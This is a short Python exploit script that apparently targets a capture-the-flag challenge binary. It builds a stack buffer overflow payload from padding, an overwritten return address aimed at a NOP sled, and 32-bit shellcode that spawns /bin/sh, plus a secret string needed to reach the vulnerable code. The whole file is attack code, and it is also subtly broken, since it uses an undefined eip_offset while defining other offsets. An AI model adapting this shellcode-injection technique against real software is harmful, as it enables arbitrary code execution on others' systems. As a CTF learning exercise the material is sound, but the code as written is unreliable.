#!/usr/bin/env python

rsp_offset=38 #points to
rbp_offset=30 #clobbered with

shell_code = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" #http://shell-storm.org/shellcode/files/shellcode-827.php

eip = '\x90\xd4\xff\xff'     #Location in NOP sled

buf = 'A'*eip_offset         #Add our start buffer
buf += eip                   #Add address we want eip to be set as
buf += '\x90'*20             #NOP sled for fudge factor
buf += shell_code            #Shellcode
buf += 'A'*(1000-len(buf))   #End of buffer
buf += ' ISEHAXORZw'         #Secret is needed to reach vulnerable code

print(buf)

#Run ./ise_binary_chalv1 $(python ise_exploit.py)
